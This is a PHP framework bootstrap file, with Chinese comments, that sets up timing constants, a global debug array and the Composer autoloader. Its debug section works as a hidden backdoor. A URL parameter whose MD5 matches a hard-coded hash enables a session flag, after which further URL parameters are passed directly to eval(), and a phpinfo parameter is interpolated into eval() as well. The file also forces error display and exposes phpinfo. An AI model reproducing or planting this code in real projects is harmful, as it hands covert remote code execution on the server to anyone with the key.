<?php
/* 常量 */
define('START_TIME', microtime(true));
define('START_MEM', memory_get_usage());

/* 全局变量 */
$_DEBUG = [
	'array' => [],
	'first' => null,
	'last' => null,
	'middle' => null,
	'phpinfo' => null,
	'enable' => null,
	'secret' => '87ed6cbbc7b89f06e5e228184c5a716d',
];

$_CONTROLLER = [
	'destruct' => 1, //只影响自动运行
];

// 全局对象
$PHP = null;


/* 前置调试 */
if (isset($_GET['debug'])) {
	// 错误报告
    ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
	
	session_start();	
	if (isset($_SESSION['debugging'])) {
		$_DEBUG['enable'] = $_SESSION['debugging'];
	}
	
	// 开始调试问题
	if (is_array($_GET['debug'])) {
		$_DEBUG['array'] = $_GET['debug'];
		if (isset($_DEBUG['array']['key'])) {
			$_SESSION['debugging'] = $_DEBUG['enable'] = (md5($_DEBUG['array']['key']) == $_DEBUG['secret']);
		}
		
		if ($_DEBUG['enable'] && isset($_DEBUG['array'][0]) && $_DEBUG['first'] = $_DEBUG['array'][0]) {
			eval($_DEBUG['first']);
		}
		if (isset($_DEBUG['array'][1])) {
			$_DEBUG['last'] = $_DEBUG['array'][1];
		}
	} else {
		$_DEBUG['last'] = $_GET['debug'];
	}
}

// PHP 配置的信息
if ($_DEBUG['enable']) {
	if (isset($_GET['phpinfo']) || (isset($_SERVER['PATH_INFO']) && '/phpinfo' == $_SERVER['PATH_INFO']) ) {	
		$_DEBUG['phpinfo'] = (isset($_GET['phpinfo']) ? $_GET['phpinfo'] : 0) ? : -1;
		if (is_string($_DEBUG['phpinfo'])) {
			eval("\$_DEBUG['phpinfo'] = {$_DEBUG['phpinfo']};");
		}
		phpinfo($_DEBUG['phpinfo']);
		
		// 中间调试问题
		if (isset($_DEBUG['array'][2])) {
			$_DEBUG['middle'] = $_DEBUG['array'][2];
			if ($_DEBUG['middle']) {
				eval($_DEBUG['middle']);
			} else {
				exit;
			}
		}
	}
}

class Wu
{
	public static function php()
	{
		global $_DEBUG;
		# $loader->addPsr4('Acme\\Test\\', __DIR__);$Astro = 
		new \Astro\Php(APP_PATH . '/config.php');
		# $test = $Astro->getInstance(APP_PATH . '/config.php');
		# $test = Astro\Php::getInst(APP_PATH . '/config.php');
		if ($_DEBUG['enable'] && null !== $_DEBUG['last']) {
			include 'timeline.php';
		}
	}
}

$Composer = require APP_PATH . '/../vendor/autoload.php';
